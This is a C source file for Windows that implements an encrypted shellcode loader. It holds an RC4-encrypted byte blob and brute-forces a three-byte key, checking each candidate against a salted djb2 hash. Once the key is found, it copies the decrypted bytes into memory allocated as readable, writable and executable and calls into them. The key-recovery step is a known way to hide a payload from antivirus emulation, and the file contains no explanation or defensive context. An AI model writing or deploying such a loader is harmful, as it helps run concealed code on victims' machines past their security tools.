#include <windows.h>

// Encrypted shellcode
unsigned char encrypted_shellcode[] = "\x9a\xe3\xc9\x35\xad\xe4\x03\xb3\x99\xd4\x27\x9d\x6c\x99\xf8\x8d\x48\xe6\x35\x38\x79\xdd\xa2\x4c\x61\x7d\x58\x9b\x96\x1e\x68\x38\xe4\x90\x53\x09\x1f\x3d\x5e\x00\x81\x7d\x22\x55\xf8\xcc\xf3\xae\x5c\x4e\xfb\x81\xed\x49\x7e\x9c\x5b\xab\x74\xe1\x50\x79\x89\x25\x53\x25\x2e\x1d\xf0\x1b\xa7\x15\xb5\xc1\x34\x06\xf5\x2e\x80\xb5\x98\x30\x12\x68\x5a\xc9\x38\xb9\x29\xb7\x6d\xf7\x1e\x21\x7d\xec\x07\x7b\x8e\x08\x64\x95\xbc\x14\x2c\x2a\x20\x86\x96\xbc\x97\x92\xad\x0e\x4c\x43\x4b\x00\x19\x14\xb8\xfd\xd6\xfe\x5a\xd8\x72\x3c\xb4\xf2\x1a\x55\x45\x56\x1c\x80\xd0\xec\xc8\x99\x1f\x3e\xfe\x80\x1f\x7a\xb4\x95\x50\x07\x0d\x23\x14\x1f\x85\x51\x0d\x25\xf0\xc6\xb8\x05\xa6\xc2\xee\xff\x95\x02\x83\xc7\x3a\xd6\x5b\x5f\x89\xaa\x5c\x7b\x69\xbf\xa5\xef\x44\x98\x65\x95\x9b\x9f\x36\xe7\x89\x11\x2a\x11\x17\x98\x89\x74\xae\x36\x52\xc2\xfa\xba\xe7\x74\xfc\xce\x8d\xd7\xab\x65\x22\xc3\x58\x48\x3f\x4c\x4f\xe7\x1d\x0b\xf7\x00\x50\x0e\x73\x6f\xbb\x63\xf4\x2e\x01\xdc\x40\x41\xeb\x96\xc9\x0d\x17\xc4\x55\xb1\x64\x97\x33\x1a\x25\xa6\x24\x00\x8d\xb7\xb8\x3e\xa6\x7d\x9d\x31\x9f\x15\xaf\x74\x8e\x62\x5e\xc7\xb9\x06\x59\x38\x32\x1d\xd3\x05\x74\xb2\x93\x2c\x48\xef\x04\x6f\x0b\x96\x14\xe6\xdf\x7f\xec\x7c\x1e\x6f\x5c\xd0\xdd\xbe\x5a\x98\xec\xcf\xc2";
unsigned char expected_hash[] = "\x48\x6b\x6a\xa9";
unsigned char salt[] = "\xcd\x49\x5a\xfd\x78\x83\x6c\xcf";

// RC4 state structure
typedef struct {
    unsigned char S[256];
    unsigned char i;
    unsigned char j;
} rc4_state_t;

// RC4 initialization (KSA)
void rc4_init(rc4_state_t *st, const unsigned char *key, int keylen) {
    int i, j = 0;
    unsigned char tmp;
    
    for (i = 0; i < 256; i++) st->S[i] = (unsigned char)i;
    st->i = 0;
    st->j = 0;
    
    for (i = 0; i < 256; i++) {
        j = (j + st->S[i] + key[i % keylen]) % 256;
        tmp = st->S[i];
        st->S[i] = st->S[j];
        st->S[j] = tmp;
    }
    st->i = 0;
    st->j = 0;
}

// RC4 decryption (PRGA)
void rc4_decrypt(rc4_state_t *st, unsigned char *data, int len) {
    int k;
    unsigned char tmp, K;
    
    for (k = 0; k < len; k++) {
        st->i = (st->i + 1) % 256;
        st->j = (st->j + st->S[st->i]) % 256;
        tmp = st->S[st->i];
        st->S[st->i] = st->S[st->j];
        st->S[st->j] = tmp;
        K = st->S[(st->S[st->i] + st->S[st->j]) % 256];
        data[k] ^= K;
    }
}

// djb2 hash for validation
unsigned int djb2_hash(const unsigned char *data, int len) {
    unsigned int hash = 5381;
    int i;
    
    for (i = 0; i < len; i++) {
        hash = ((hash * 33) + data[i]) & 0xFFFFFFFF;
    }
    return hash;
}

// Convert 4 bytes to uint (little-endian)
unsigned int bytes_to_uint(const unsigned char *bytes) {
    return (unsigned int)bytes[0] | 
           ((unsigned int)bytes[1] << 8) | 
           ((unsigned int)bytes[2] << 16) | 
           ((unsigned int)bytes[3] << 24);
}

// Recursive bruteforce to find RC4 key
int bruteforce_key(unsigned char *key, int pos, int max_len, int shellcode_len, unsigned char *decrypted_buffer) {
    int i;
    rc4_state_t rc4_state;
    unsigned int calculated_hash;
    unsigned int target_hash = bytes_to_uint(expected_hash);
    
    // If we've built a complete key, test it
    if (pos == max_len) {
        // Copy encrypted shellcode to decrypt buffer
        memcpy(decrypted_buffer, encrypted_shellcode, shellcode_len);
        
        // Initialize RC4 with current key and decrypt
        rc4_init(&rc4_state, key, max_len);
        rc4_decrypt(&rc4_state, decrypted_buffer, shellcode_len);
        
        // Create buffer for shellcode + salt for hash validation
        unsigned char hash_input[4096 + 64];
        memcpy(hash_input, decrypted_buffer, shellcode_len);
        int salt_len = sizeof(salt) - 1; // -1 for null terminator
        memcpy(hash_input + shellcode_len, salt, salt_len);
        
        // Calculate hash and validate
        calculated_hash = djb2_hash(hash_input, shellcode_len + salt_len);
        
        if (calculated_hash == target_hash) {
            return 1; // Key found!
        }
        return 0;
    }
    
    // Try all possible byte values (1-255, avoiding null bytes)
    for (i = 1; i <= 255; i++) {
        key[pos] = (unsigned char)i;
        if (bruteforce_key(key, pos + 1, max_len, shellcode_len, decrypted_buffer)) {
            return 1;
        }
    }
    
    return 0;
}

int main() {
    unsigned char key[3];
    unsigned char decrypted_shellcode[4096];
    int shellcode_len = sizeof(encrypted_shellcode) - 1;
    int found = 0;
    
    // Bruteforce RC4 key of 3 bytes
    memset(key, 0, sizeof(key));
    if (bruteforce_key(key, 0, 3, shellcode_len, decrypted_shellcode)) {
        found = 1;
    }
    
    if (found) {
        // Key found, inject and execute decrypted shellcode
        void *execs = VirtualAlloc(0, shellcode_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        if (execs) {
            memcpy(execs, decrypted_shellcode, shellcode_len);
            ((void(*)())(execs))();
        }
    }

    return 0;
}